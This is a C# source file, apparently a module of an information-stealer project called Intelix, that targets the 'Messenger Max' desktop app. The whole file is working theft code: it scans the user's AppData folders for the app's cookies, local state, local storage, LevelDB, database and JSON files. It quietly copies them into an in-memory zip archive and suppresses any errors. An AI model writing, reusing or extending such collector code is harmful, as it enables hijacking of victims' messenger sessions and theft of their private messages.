using System;
using System.IO;
using Intelix.Helper.Data;

namespace Intelix.Targets.Messangers
{
    public class MessengerMax : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string local = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

            string[] paths = {
                Path.Combine(appdata, "Messenger Max"),
                Path.Combine(appdata, "MessengerMax"),
                Path.Combine(local, "Messenger Max"),
                Path.Combine(local, "Programs", "messenger-max")
            };

            foreach (string dir in paths)
            {
                if (!Directory.Exists(dir)) continue;

                var entry = new Counter.CounterApplications { Name = "Messenger MAX" };

                foreach (string file in Directory.GetFiles(dir, "*", SearchOption.AllDirectories))
                {
                    string ext = Path.GetExtension(file).ToLower();
                    string name = Path.GetFileName(file).ToLower();

                    if (ext != ".json" && ext != ".db" && ext != ".sqlite"
                        && ext != ".ldb" && ext != ".log" && ext != ".dat"
                        && name != "cookies" && name != "local state"
                        && name != "local storage")
                        continue;

                    if (new FileInfo(file).Length > 10 * 1024 * 1024) continue;

                    try
                    {
                        string relative = file.Substring(dir.Length).TrimStart(Path.DirectorySeparatorChar);
                        string rel = "Messangers\\MessengerMax\\" + relative;
                        zip.AddFile(rel, File.ReadAllBytes(file));
                        entry.Files.Add(file + " => " + rel);
                    }
                    catch { }
                }

                if (entry.Files.Count > 0)
                {
                    counter.Messangers.Add(entry);
                    break;
                }
            }
        }
    }
}
